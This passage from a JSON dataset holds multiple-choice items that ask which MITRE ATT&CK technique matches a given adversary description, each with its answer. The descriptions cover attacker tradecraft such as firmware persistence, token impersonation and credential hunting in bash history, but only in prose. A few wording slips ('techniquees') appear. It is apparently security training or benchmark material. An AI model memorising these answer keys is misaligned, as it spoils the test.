      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",
      "options": "A. Indicator Removal: File Deletion, B. Container and Resource Discovery, C. Domain or Tenant Policy Modification, D. Hijack Execution Flow: Path Interception by Unquoted Path",
      "choice": "B. Container and Resource Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.\n\nA. Gather Victim Network Information: Domain Properties, B. Pre-OS Boot: Component Firmware, C. Masquerading: Masquerade File Type, D. Defacement: Internal Defacement\nA:",
    "context": "",
    "output": "B. Pre-OS Boot: Component Firmware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
      "options": "A. Gather Victim Network Information: Domain Properties, B. Pre-OS Boot: Component Firmware, C. Masquerading: Masquerade File Type, D. Defacement: Internal Defacement",
      "choice": "B. Pre-OS Boot: Component Firmware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\nA. Hide Artifacts: Hidden Window, B. Hijack Execution Flow: Services File Permissions Weakness, C. Hijack Execution Flow: AppDomainManager, D. Multi-Factor Authentication Interception\nA:",
    "context": "",
    "output": "B. Hijack Execution Flow: Services File Permissions Weakness",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
      "options": "A. Hide Artifacts: Hidden Window, B. Hijack Execution Flow: Services File Permissions Weakness, C. Hijack Execution Flow: AppDomainManager, D. Multi-Factor Authentication Interception",
      "choice": "B. Hijack Execution Flow: Services File Permissions Weakness",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.\n\nA. Forge Web Credentials: SAML Tokens, B. Access Token Manipulation: Make and Impersonate Token, C. Account Manipulation: Additional Email Delegate Permissions, D. Develop Capabilities: Malware\nAnswer:",
    "context": "",
    "output": "B. Access Token Manipulation: Make and Impersonate Token",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
      "options": "A. Forge Web Credentials: SAML Tokens, B. Access Token Manipulation: Make and Impersonate Token, C. Account Manipulation: Additional Email Delegate Permissions, D. Develop Capabilities: Malware",
      "choice": "B. Access Token Manipulation: Make and Impersonate Token",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.\n\nA. Endpoint Denial of Service: Application Exhaustion Flood, B. Gather Victim Org Information: Identify Business Tempo, C. Acquire Infrastructure: Serverless, D. Forge Web Credentials: Web Cookies\nA:",
    "context": "",
    "output": "A. Endpoint Denial of Service: Application Exhaustion Flood",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.",
      "options": "A. Endpoint Denial of Service: Application Exhaustion Flood, B. Gather Victim Org Information: Identify Business Tempo, C. Acquire Infrastructure: Serverless, D. Forge Web Credentials: Web Cookies",
      "choice": "A. Endpoint Denial of Service: Application Exhaustion Flood",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.\nA. Software Discovery, B. Create Account: Cloud Account, C. Hide Artifacts: Hidden Files and Directories, D. Hijack Execution Flow: COR_PROFILER\nAnswer:",
    "context": "",
    "output": "A. Software Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
      "options": "A. Software Discovery, B. Create Account: Cloud Account, C. Hide Artifacts: Hidden Files and Directories, D. Hijack Execution Flow: COR_PROFILER",
      "choice": "A. Software Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. \n\nSome adversaries may also use Automated Collection on removable media.\nA. Create or Modify System Process: Launch Agent, B. Data from Removable Media, C. Input Capture: Credential API Hooking, D. Execution Guardrails: Environmental Keying",
    "context": "",
    "output": "B. Data from Removable Media",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. \n\nSome adversaries may also use Automated Collection on removable media.",
      "options": "A. Create or Modify System Process: Launch Agent, B. Data from Removable Media, C. Input Capture: Credential API Hooking, D. Execution Guardrails: Environmental Keying",
      "choice": "B. Data from Removable Media",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.\n\nPossible answers:\nA. Gather Victim Host Information: Firmware, B. Event Triggered Execution, C. Process Injection: ListPlanting, D. Password Policy Discovery",
    "context": "",
    "output": "B. Event Triggered Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
      "options": "A. Gather Victim Host Information: Firmware, B. Event Triggered Execution, C. Process Injection: ListPlanting, D. Password Policy Discovery",
      "choice": "B. Event Triggered Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to the techniquees in order to escalate privileges.\n\nPossible answers:\nA. Create or Modify System Process, B. System Binary Proxy Execution: Control Panel, C. Drive-by Compromise, D. Network Service Discovery",
    "context": "",
    "output": "A. Create or Modify System Process",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to the techniquees in order to escalate privileges.",
      "options": "A. Create or Modify System Process, B. System Binary Proxy Execution: Control Panel, C. Drive-by Compromise, D. Network Service Discovery",
      "choice": "A. Create or Modify System Process",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.\n\nA. Traffic Signaling, B. Hide Artifacts: VBA Stomping, C. Event Triggered Execution: Screensaver, D. System Network Configuration Discovery: Internet Connection Discovery\nA:",
    "context": "",
    "output": "D. System Network Configuration Discovery: Internet Connection Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
      "options": "A. Traffic Signaling, B. Hide Artifacts: VBA Stomping, C. Event Triggered Execution: Screensaver, D. System Network Configuration Discovery: Internet Connection Discovery",
      "choice": "D. System Network Configuration Discovery: Internet Connection Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.\nA. Indicator Removal: Timestomp, B. Remote Services: Distributed Component Object Model, C. Gather Victim Host Information: Firmware, D. Masquerading: Match Legitimate Name or Location\nAnswer:",
    "context": "",
    "output": "D. Masquerading: Match Legitimate Name or Location",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "options": "A. Indicator Removal: Timestomp, B. Remote Services: Distributed Component Object Model, C. Gather Victim Host Information: Firmware, D. Masquerading: Match Legitimate Name or Location",
      "choice": "D. Masquerading: Match Legitimate Name or Location",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD. Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure.\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.\n\nA. System Location Discovery, B. Masquerading: Match Legitimate Name or Location, C. Communication Through Removable Media, D. Software Deployment Tools\nA:",
    "context": "",
    "output": "D. Software Deployment Tools",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD. Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure.\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
      "options": "A. System Location Discovery, B. Masquerading: Match Legitimate Name or Location, C. Communication Through Removable Media, D. Software Deployment Tools",
      "choice": "D. Software Deployment Tools",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.\n\nPossible answers:\nA. Data Obfuscation: Steganography, B. Supply Chain Compromise, C. Compromise Infrastructure: Domains, D. System Binary Proxy Execution: Verclsid",
    "context": "",
    "output": "C. Compromise Infrastructure: Domains",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.",
      "options": "A. Data Obfuscation: Steganography, B. Supply Chain Compromise, C. Compromise Infrastructure: Domains, D. System Binary Proxy Execution: Verclsid",
      "choice": "C. Compromise Infrastructure: Domains",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)\nA. Impair Defenses: Disable or Modify System Firewall, B. Obfuscated Files or Information: Dynamic API Resolution, C. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, D. Gather Victim Org Information: Identify Business Tempo\nAnswer:",
    "context": "",
    "output": "D. Gather Victim Org Information: Identify Business Tempo",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)",
      "options": "A. Impair Defenses: Disable or Modify System Firewall, B. Obfuscated Files or Information: Dynamic API Resolution, C. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, D. Gather Victim Org Information: Identify Business Tempo",
      "choice": "D. Gather Victim Org Information: Identify Business Tempo",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).\n\nOptions:\nA. Brute Force: Password Guessing, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. Weaken Encryption: Disable Crypto Hardware, D. System Binary Proxy Execution: MMC",
    "context": "",
    "output": "C. Weaken Encryption: Disable Crypto Hardware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).",
      "options": "A. Brute Force: Password Guessing, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. Weaken Encryption: Disable Crypto Hardware, D. System Binary Proxy Execution: MMC",
      "choice": "C. Weaken Encryption: Disable Crypto Hardware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\nA. Shared Modules, B. Web Service: One-Way Communication, C. Unsecured Credentials: Credentials In Files, D. Gather Victim Host Information: Firmware",
    "context": "",
    "output": "B. Web Service: One-Way Communication",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "options": "A. Shared Modules, B. Web Service: One-Way Communication, C. Unsecured Credentials: Credentials In Files, D. Gather Victim Host Information: Firmware",
      "choice": "B. Web Service: One-Way Communication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.\nA. System Binary Proxy Execution: CMSTP, B. Container Administration Command, C. Encrypted Channel: Asymmetric Cryptography, D. System Binary Proxy Execution: Regsvcs/Regasm\nAnswer:",
    "context": "",
    "output": "C. Encrypted Channel: Asymmetric Cryptography",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
      "options": "A. System Binary Proxy Execution: CMSTP, B. Container Administration Command, C. Encrypted Channel: Asymmetric Cryptography, D. System Binary Proxy Execution: Regsvcs/Regasm",
      "choice": "C. Encrypted Channel: Asymmetric Cryptography",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.\n\nA. Gather Victim Identity Information, B. Gather Victim Identity Information: Email Addresses, C. Taint Shared Content, D. Unsecured Credentials: Bash History\nAnswer:",
    "context": "",
    "output": "D. Unsecured Credentials: Bash History",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.",
      "options": "A. Gather Victim Identity Information, B. Gather Victim Identity Information: Email Addresses, C. Taint Shared Content, D. Unsecured Credentials: Bash History",
      "choice": "D. Unsecured Credentials: Bash History",
      "category": [
        "MITREFlan"
      ],
